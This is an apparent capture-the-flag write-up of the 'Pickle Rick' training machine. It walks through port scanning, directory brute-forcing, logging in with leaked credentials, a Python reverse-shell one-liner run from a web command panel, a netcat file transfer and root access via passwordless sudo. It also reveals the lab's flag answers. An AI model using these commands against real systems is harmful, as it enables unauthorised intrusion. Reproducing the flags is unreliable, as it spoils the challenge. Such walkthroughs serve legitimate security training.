K4P3R3 | 6TH AUGUST 2022

PickleRick boot2root CAPTCHA THE FLAG

Writeup:

Initial scan and viewing the source code.
------------------------------
Nmap scan:
$ export IP=10.10.245.139

$ nmap -sVC -n -A -Pn -p- $IP --min-rate 5000
-------------
Output:

┌──(k4p3r3㉿kali)-[~/Downloads/thm.tasks/piclerick]
└─$ nmap -sVC -n -A -Pn -p- 10.10.245.139 --min-rate 5000                  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-06 10:00 EAT
Warning: 10.10.245.139 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.245.139
Host is up (0.16s latency).
Not shown: 65419 closed tcp ports (conn-refused), 114 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:34:83:06:8f:f9:9e:da:8b:b2:81:d5:e4:65:83:e3 (RSA)
|   256 18:ab:68:1f:d4:ad:0a:a3:3f:d6:dc:b4:5d:9d:38:e2 (ECDSA)
|_  256 64:6d:46:b2:5f:7e:d0:c5:d2:b9:5e:68:bc:b9:0b:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.68 seconds

We get port 22 and 80 open running SSH and http respectively
We can try to ssh into the machine having the username and trying to bruteforce the password maybe.


┌──(k4p3r3㉿kali)-[~/Downloads/thm.tasks/piclerick]
└─$ ssh R1ckRul3s@10.10.245.139
The authenticity of host '10.10.245.139 (10.10.245.139)' can't be established.
ED25519 key fingerprint is SHA256:8xH97vPJhYkMJJ7ywOdJLXHGpH0Eo/w3CGxqQSqmXiI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? YES
Warning: Permanently added '10.10.245.139' (ED25519) to the list of known hosts.
R1ckRul3s@10.10.245.139: Permission denied (publickey).

Well permission denied
---------------------------------------------
So lets do directory bruteforcing to see some of the hidden directories.

┌──(k4p3r3㉿kali)-[~/Downloads/thm.tasks/piclerick]
└─$ gobuster dir -u http://10.10.245.139 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.245.139
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,txt,cgi,html,js,css,py,php
[+] Timeout:                 10s
===============================================================
2022/08/06 11:09:42 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882] 
/assets               (Status: 301) [Size: 315] [--> http://10.10.245.139/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
/robots.txt           (Status: 200) [Size: 17] 

In robots.txt we get : Wubbalubbadubdub

Navigating to http://10.10.245.139/login.php we get a login page

Using the username in the source code {R1ckRul3s} and trying out the word in the robots.txt {Wubbalubbadubdub} and we managed to log in to access a command line panel.

I tried executing several commands until i stumbled upon python3 command that the system can execute
Trying python3 -c "print('Hey there')" have an output
Here we go, we got to something juicy

Pentestmonkey cheat sheets will be a great help for a command reverse shell

So i executed the python reverse shell to gain access into the machine

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Then  listenng on my attack machine and executing the command on the victim we get a reverse shell

┌──(k4p3r3㉿kali)-[~/Downloads/thm.tasks/piclerick]
└─$ rlwrap nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.9.8.255] from (UNKNOWN) [10.10.245.139] 36484
/bin/sh: 0: can't access tty; job control turned off
$ 

We get to make the shell stable by putting in the below commands;

$ python3 -c 'import pty;pty.spawn("/bin/bash");
$stty raw -echo
$fg
$xport TERM=xterm

Kaboom we got a stable shell to work on

Next i opted to first escalate my privileges just to own the machine first to make my working easy when looking for the ingredients.
Upload linpeas.sh from my attack machine:


┌──(k4p3r3㉿kali)-[~/Downloads/thm.tasks/piclerick]
└─$ nc 10.10.245.139 4444 -w 3 < linpeas.sh

Recieve it at the target machine;
nc -lvp 4444 > /dev/shm/linpeas.sh
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [10.9.8.255] port 4444 [tcp/*] accepted (family 2, sport 42864)
cd /dev/shm
ls
linpeas.sh

I make the script executable and then run it.
$chmod +x linpeas.sh
$./linpeas.sh

The machine can work without password input so typing sudo bash on the terminal gives me ownership of the machine.
Vuola!!!
sudo bash
c
c: command not found
cd
ls
3rd.txt  snap //This gives us our third ingredient
cat 3rd.txt
3rd ingredients: fleeb juice
cd /home
ls
rick  ubuntu
cd /rick
bash: cd: /rick: No such file or directory
ls
rick  ubuntu
cd rick
ls 
second ingredient
cat: ingredients: No such file or directory
cat *
1 jerry tear   // Second ingredient for us
Terminated-10-245-139:/home/rick# 
$ 



                                                                                                      
